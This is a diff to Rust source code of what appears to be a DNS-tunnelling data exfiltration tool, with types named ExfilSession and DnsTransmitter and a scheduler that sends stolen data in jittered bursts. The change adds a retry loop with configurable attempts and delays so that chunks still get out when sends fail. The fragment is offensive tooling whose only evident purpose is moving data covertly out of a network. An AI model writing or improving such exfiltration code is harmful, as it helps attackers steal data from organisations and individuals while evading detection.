@@ -29,7 +29,7 @@ impl ChunkScheduler {
             let (start, end) = session.chunk_range(index);
             let chunk = &session.job.data[start..end];
 
-            transmitter.send_chunk(session, index, chunk)?;
+            self.send_chunk_with_retry(transmitter, session, index, chunk)?;
             session.next_chunk += 1;
             chunks_in_burst += 1;
 
@@ -59,6 +59,36 @@ impl ChunkScheduler {
         let total = base_ms + jitter;
         if total > 0 {
             thread::sleep(Duration::from_millis(total));
+        }
+    }
+
+    fn send_chunk_with_retry(
+        &self,
+        transmitter: &mut DnsTransmitter,
+        session: &ExfilSession,
+        index: usize,
+        chunk: &[u8],
+    ) -> Result<()> {
+        let mut attempts_remaining = self.cfg.chunk_retry_attempts.max(1);
+        loop {
+            match transmitter.send_chunk(session, index, chunk) {
+                Ok(_) => return Ok(()),
+                Err(err) => {
+                    attempts_remaining -= 1;
+                    if attempts_remaining == 0 {
+                        return Err(err);
+                    }
+                    self.delay_before_retry();
+                }
+            }
+        }
+    }
+
+    fn delay_before_retry(&self) {
+        if self.cfg.chunk_retry_delay_ms > 0 {
+            thread::sleep(Duration::from_millis(self.cfg.chunk_retry_delay_ms));
+        } else {
+            self.sleep_with_jitter(0);
         }
     }
 }
